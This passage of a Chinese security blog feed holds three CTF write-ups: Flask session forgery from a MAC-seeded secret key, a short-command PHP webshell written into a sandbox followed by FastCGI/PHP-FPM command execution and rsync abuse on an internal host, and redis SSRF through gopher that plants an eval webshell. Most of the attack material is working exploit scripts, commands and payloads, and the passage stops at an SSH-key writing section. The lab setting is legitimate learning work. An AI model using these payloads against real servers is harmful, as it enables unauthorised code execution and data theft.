exp'</span>)</span><br><span class="line">os.system(<span class="string">'rm -rf exp.zip'</span>)</span><br></pre></td></tr></table></figure><p>每次读取目标路径只需一下命令即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python exp.py &#x2F;xxx&#x2F;xxx&#x2F;xxx</span><br></pre></td></tr></table></figure><p>上传时抓个包，有所发现</p><img src="/2020/07/22/HCTF-2018-Hideandseek/4.png" class=""><p>session值很熟悉，不是jwt就是flask session，根据二者之间的差异，应该属于后者</p><p>用脚本解密一下看看存储的是什么</p><img src="/2020/07/22/HCTF-2018-Hideandseek/5.png" class=""><p>可以看到存储的是刚刚登录时候的用户名，联想到刚才admin账户无法登录，应该是已经注册了，那就需要伪造flask session，那么就要拿到secret key</p><p>这里就是新接触的知识内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，</span><br><span class="line">用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</span><br><span class="line">environ是 — 当前进程的环境变量列表，self可以替换成进程号。</span><br></pre></td></tr></table></figure><p>这里有一篇有关/proc目录讲解的文章<a href="https://www.cnblogs.com/DswCnblog/p/5780389.html" target="_blank" rel="noopener">https://www.cnblogs.com/DswCnblog/p/5780389.html</a></p><p>读取/proc/self/environ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">HOSTNAME&#x3D;04c86f855cc2</span><br><span class="line">SHLVL&#x3D;1</span><br><span class="line">PYTHON_PIP_VERSION&#x3D;19.1.1</span><br><span class="line">HOME&#x3D;&#x2F;root</span><br><span class="line">GPG_KEY&#x3D;0D96DF4D4110E5C43FBFB17F2D347EA6AA65421D</span><br><span class="line">UWSGI_INI&#x3D;&#x2F;app&#x2F;uwsgi.ini</span><br><span class="line">WERKZEUG_SERVER_FD&#x3D;3</span><br><span class="line">NGINX_MAX_UPLOAD&#x3D;0UWSGI_PROCESSES&#x3D;16</span><br><span class="line">STATIC_URL&#x3D;&#x2F;static_&#x3D;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;python</span><br><span class="line">UWSGI_CHEAPER&#x3D;2</span><br><span class="line">WERKZEUG_RUN_MAIN&#x3D;true</span><br><span class="line">NGINX_VERSION&#x3D;1.15.81~</span><br><span class="line">stretchPATH&#x3D;&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;bin</span><br><span class="line">NJS_VERSION&#x3D;1.15.8.0.2.7-1~</span><br><span class="line">stretchLANG&#x3D;C.UTF8</span><br><span class="line">PYTHON_VERSION&#x3D;3.6.8</span><br><span class="line">NGINX_WORKER_PROCESSES&#x3D;1</span><br><span class="line">LISTEN_PORT&#x3D;80</span><br><span class="line">STATIC_INDEX&#x3D;0</span><br><span class="line">PWD&#x3D;&#x2F;app</span><br><span class="line">PYTHONPATH&#x3D;&#x2F;app</span><br><span class="line">STATIC_PATH&#x3D;&#x2F;app&#x2F;staticF</span><br><span class="line">LAG&#x3D;not_flag</span><br></pre></td></tr></table></figure><p>这里注意到有<code>/app/uwsgi.ini</code>文件，读取一下内容</p><img src="/2020/07/22/HCTF-2018-Hideandseek/6.png" class=""><p>这里好像有点小问题，/app/main.py并不能读到源码，看wp，应该是buu环境问题，原题的文件路径还是能够访问并读取文件的，路径为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;app&#x2F;hard_t0_guess_n9f5a95b5ku9fg&#x2F;hard_t0_guess_also_df45v48ytj9_main.py</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session,render_template,redirect, url_for, escape, request,Response</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = str(random.random()*<span class="number">100</span>)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">100</span> * <span class="number">1024</span></span><br><span class="line">ALLOWED_EXTENSIONS = set([<span class="string">'zip'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> \</span><br><span class="line">           filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    error = request.args.get(<span class="string">'error'</span>, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span>(error == <span class="string">'1'</span>):</span><br><span class="line">        session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, forbidden=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'username'</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>, user=session[<span class="string">'username'</span>], flag=flag.flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    username=request.form[<span class="string">'username'</span>]</span><br><span class="line">    password=request.form[<span class="string">'password'</span>]</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span> <span class="keyword">and</span> username != <span class="string">''</span> <span class="keyword">and</span> password != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">if</span>(username == <span class="string">'admin'</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>,error=<span class="number">1</span>))</span><br><span class="line">        session[<span class="string">'username'</span>] = username</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout', methods=['GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    session.pop(<span class="string">'username'</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/upload', methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">'the_file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    file = request.files[<span class="string">'the_file'</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">        filename = secure_filename(file.filename)</span><br><span class="line">        file_save_path = os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], filename)</span><br><span class="line">        <span class="keyword">if</span>(os.path.exists(file_save_path)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">'This file already exists'</span></span><br><span class="line">        file.save(file_save_path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'This file is not a zipfile'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        extract_path = file_save_path + <span class="string">'_'</span></span><br><span class="line">        os.system(<span class="string">'unzip -n '</span> + file_save_path + <span class="string">' -d '</span>+ extract_path)</span><br><span class="line">        read_obj = os.popen(<span class="string">'cat '</span> + extract_path + <span class="string">'/*'</span>)</span><br><span class="line">        file = read_obj.read()</span><br><span class="line">        read_obj.close()</span><br><span class="line">        os.system(<span class="string">'rm -rf '</span> + extract_path)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        file = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    os.remove(file_save_path)</span><br><span class="line">    <span class="keyword">if</span>(file != <span class="literal">None</span>):</span><br><span class="line">        <span class="keyword">if</span>(file.find(base64.b64decode(<span class="string">'aGN0Zg=='</span>).decode(<span class="string">'utf-8'</span>)) != <span class="number">-1</span>):</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>, error=<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> Response(file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#app.run(debug=True)</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>, debug=<span class="literal">True</span>, port=<span class="number">10008</span>)</span><br></pre></td></tr></table></figure><p>从代码中找到关键点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">random.seed(uuid.getnode())</span><br></pre></td></tr></table></figure><p>这一行代码很眼熟，原来种子用的是mac地址，在<code>/sys/class/net/eth0/address</code>下就能看到</p><img src="/2020/07/22/HCTF-2018-Hideandseek/7.png" class=""><p>生成一下secret</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">mac = <span class="string">"02:42:ae:02:67:f4"</span></span><br><span class="line">temp = mac.split(<span class="string">':'</span>)</span><br><span class="line">temp = [int(i,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = [bin(i).replace(<span class="string">'0b'</span>,<span class="string">''</span>).zfill(<span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> temp]</span><br><span class="line">temp = <span class="string">''</span>.join(temp)</span><br><span class="line">mac = int(temp,<span class="number">2</span>)</span><br><span class="line">random.seed(mac)</span><br><span class="line">randStr = str(random.random()*<span class="number">100</span>)</span><br><span class="line">print(randStr)</span><br><span class="line"><span class="comment">#53.15748623365909</span></span><br></pre></td></tr></table></figure><img src="/2020/07/22/HCTF-2018-Hideandseek/9.png" class=""><p>然后替换一下admin的cookie，就可以了</p><img src="/2020/07/22/HCTF-2018-Hideandseek/8.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf473831530_2018_web_virink_web</title>
      <link href="/2020/07/22/ctf473831530-2018-web-virink-web/"/>
      <url>/2020/07/22/ctf473831530-2018-web-virink-web/</url>
      
        <content type="html"><![CDATA[<p>重新开始刷题的第一道，好活，好好整！<a id="more"></a></p><p>开题送源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $sandbox = <span class="string">'/www/sandbox/'</span> . md5(<span class="string">'orange'</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">    mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class="string">'cmd'</span>]) &lt;= <span class="number">20</span>) &#123;</span><br><span class="line">        exec($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'reset'</span>])) &#123;</span><br><span class="line">        exec(<span class="string">'/bin/rm -rf '</span> . $sandbox);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br /&gt; IP : &#123;\$_SERVER['REMOTE_ADDR']&#125;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><img src="/2020/07/22/ctf473831530-2018-web-virink-web/1.png" class=""><p>文件存储路径就是md5(orange.ip)</p><p>从源码中可以看出要写长度&lt;20的shell，参考文章<a href="https://blog.csdn.net/iamsongyu/article/details/84483638" target="_blank" rel="noopener">https://blog.csdn.net/iamsongyu/article/details/84483638</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://273d5199-9497-4159-9388-3c9e34f963f4.node3.buuoj.cn/'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">filename = [<span class="string">r'&gt;echo\ \\'</span>,</span><br><span class="line">            <span class="string">r"&gt;\'\&lt;\?php \\"</span>,</span><br><span class="line">            <span class="string">r'&gt;eval\('</span>,</span><br><span class="line">            <span class="string">r'&gt;\$_POST\[c\]\)'</span>,</span><br><span class="line">            <span class="string">r"&gt;\;\'\&gt;2.php"</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> filename:</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'cmd'</span>: i</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url, params=params)</span><br><span class="line">    print(i, r.status_code)</span><br><span class="line"></span><br><span class="line">cmd = [<span class="string">'ls -tr&gt;1.sh'</span>, <span class="string">'sh 1.sh'</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cmd:</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">'cmd'</span>: i</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url, params=params)</span><br><span class="line">    print(i, r.status_code)</span><br></pre></td></tr></table></figure><p>通过上面的脚本写入shell，访问sandbox/xxx/2.php即可，这里用蚁剑连上，看一下主机信息</p><img src="/2020/07/22/ctf473831530-2018-web-virink-web/2.png" class=""><p>下面要进行内网扫描，提示可以用python3，用扫描脚本即可。这里根据buu下一个ip地址是内网，推测内网ip为173.202.77.11</p><p>扫描开放端口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'active_port.txt'</span>,<span class="string">'at'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">80</span>,<span class="number">65535</span>+<span class="number">1</span>):</span><br><span class="line">            ip = <span class="string">'173.202.77.11'</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip,i))</span><br><span class="line">                s.close()</span><br><span class="line">                f.writelines(str(i)+<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">except</span> socket.error:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    foo()</span><br><span class="line">    print(<span class="string">'ok'</span>)</span><br></pre></td></tr></table></figure><p>扫出有三个开放端口分别是80，873，9000端口</p><p>这里要用到p神的文章</p><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p><p>根据文章描述，PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信，直接用p神的exp，文章中有下载链接，把exp上传到路径下</p><p>这里还要注意80端口开放，有一个redirect.php文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fpm.py 173.202.77.11 &#x2F;www&#x2F;redirect.php -c \&quot;&lt;?php system(&#39;ls &#x2F; -all&#39;);?&gt;\&quot;</span><br></pre></td></tr></table></figure><img src="/2020/07/22/ctf473831530-2018-web-virink-web/3.png" class=""><p>可以看到flag文件没有权限读取</p><p>看公开的wp说是要用到873端口的rsync未授权访问</p><p><a href="https://www.cnblogs.com/leixiao-/p/10227086.html" target="_blank" rel="noopener">https://www.cnblogs.com/leixiao-/p/10227086.html</a></p><p>先读取一下rsync的配置文件</p><img src="/2020/07/22/ctf473831530-2018-web-virink-web/4.png" class=""><p>配置中定义了src模块并且路径指向了根目录，能够读取文件内容，下面用博客里的方法本分出flag文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 fpm.py 173.202.77.11 &#x2F;www&#x2F;redirect.php -c \&quot;&lt;?php system(&#39;rsync 127.0.0.1::src&#x2F;7h1s_i5_f14g &#x2F;tmp&#x2F;&#39;);?&gt;\&quot;</span><br></pre></td></tr></table></figure><p>之后就能到tmp路径下读取flag了</p><img src="/2020/07/22/ctf473831530-2018-web-virink-web/5.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>redis配置及SSRF利用</title>
      <link href="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/"/>
      <url>/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>昨天做了网鼎杯玄武组的SSRFME那道题，对于redis的利用不是很熟悉，今天搭一下环境把能利用的方式能过一遍<a id="more"></a></p><h3 id="安装及配置"><a href="#安装及配置" class="headerlink" title="安装及配置"></a>安装及配置</h3><p>第一步：进入到/home/data目录下</p><p>第二步： wget <a href="http://download.redis.io/releases/redis-3.2.6.tar.gz" target="_blank" rel="noopener">http://download.redis.io/releases/redis-3.2.6.tar.gz</a>  安装压缩包</p><p>第三步：解压 tar -zxvf redis-3.2.6.tar.gz</p><p>第四步：编译生成可执行环境（没有gcc会报错，安装一下gcc，其他报错可忽略）</p><p>第五步：拷贝redis-cli 、 redis-server 到 /usr/local/redis/目录，再回到redis-2.6.14 源码目录 将redis.conf 文件复制到 redis 目录下</p><p>第六步：修改redis.conf配置信息，daemonize no，no改为yes，protected=mode yes改成no，bind 127.0.0.1注释掉，具体作用在配置信息的注释信息中都有</p><p>开启redis服务</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;redis-server redis.conf</span><br></pre></td></tr></table></figure><p>再用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pstree</span><br></pre></td></tr></table></figure><p>看一下有没有redis服务在运行</p><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/1.png" class=""><h3 id="REDIS配合gopher协议进行SSRF"><a href="#REDIS配合gopher协议进行SSRF" class="headerlink" title="REDIS配合gopher协议进行SSRF"></a>REDIS配合gopher协议进行SSRF</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>gopher协议可以攻击内网的 redis、ftp等等，也可以发送 GET、POST 请求</p><h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">能未授权或者能通过弱口令认证访问到Redis服务器</span><br></pre></td></tr></table></figure><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>1.绝对路径写shell</p><p>2.写ssh公钥</p><p>3.写contrab计划任务反弹shell</p><h4 id="绝对路径写shell"><a href="#绝对路径写shell" class="headerlink" title="绝对路径写shell"></a>绝对路径写shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir &#x2F;var&#x2F;www&#x2F;html</span><br><span class="line">set dbfilename redis.php</span><br><span class="line">set webshell &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line">save</span><br><span class="line">get webshell</span><br></pre></td></tr></table></figure><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/2.png" class=""><p>可以看到shell已经成功写入，访问一下该文件</p><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/3.png" class=""><p>这里也可以用脚本来生成，之前做过一道redis的，脚本还存着</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import urllib</span><br><span class="line">protocol=<span class="string">"gopher://"</span></span><br><span class="line">ip=<span class="string">"173.52.253.11"</span></span><br><span class="line">port=<span class="string">"6379"</span></span><br><span class="line">shell=<span class="string">"\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"</span></span><br><span class="line">filename=<span class="string">"shell.php"</span></span><br><span class="line">path=<span class="string">"/var/www/html"</span></span><br><span class="line">passwd=<span class="string">""</span></span><br><span class="line">cmd=[<span class="string">"flushall"</span>,</span><br><span class="line">     <span class="string">"set 1 &#123;&#125;"</span>.format(shell.replace(<span class="string">" "</span>,<span class="string">"$&#123;IFS&#125;"</span>)),</span><br><span class="line">     <span class="string">"config set dir &#123;&#125;"</span>.format(path),</span><br><span class="line">     <span class="string">"config set dbfilename &#123;&#125;"</span>.format(filename),</span><br><span class="line">     <span class="string">"save"</span></span><br><span class="line">     ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">"AUTH &#123;&#125;"</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">":"</span>+port+<span class="string">"/_"</span></span><br><span class="line">def redis_format(arr):</span><br><span class="line">    CRLF=<span class="string">"\r\n"</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">" "</span>)</span><br><span class="line">    cmd=<span class="string">""</span></span><br><span class="line">    cmd+=<span class="string">"*"</span>+str(len(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x in redis_arr:</span><br><span class="line">        cmd+=CRLF+<span class="string">"$"</span>+str(len((x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>))))+CRLF+x.replace(<span class="string">"$&#123;IFS&#125;"</span>,<span class="string">" "</span>)</span><br><span class="line">    cmd+=CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    <span class="keyword">for</span> x in cmd:</span><br><span class="line">        payload += urllib.quote(redis_format(x))</span><br><span class="line">    <span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/4.png" class=""><p>用上面的脚本生成payload，打过去，看一下shell.php文件内容能否读到</p><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/5.png" class=""><p>成功，下面就可以getshell了，看一下我这台linux根目录下的文件</p><img src="/2020/07/16/redis%E9%85%8D%E7%BD%AE%E5%8F%8ASSRF%E5%88%A9%E7%94%A8/6.png" class=""><h4 id="写ssh公钥"><a href="#写ssh公钥" class="headerlink" title="写ssh公钥"></a>写ssh公钥</h4><p>在/root下创建一个.ssh文件夹</p><p>redis命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 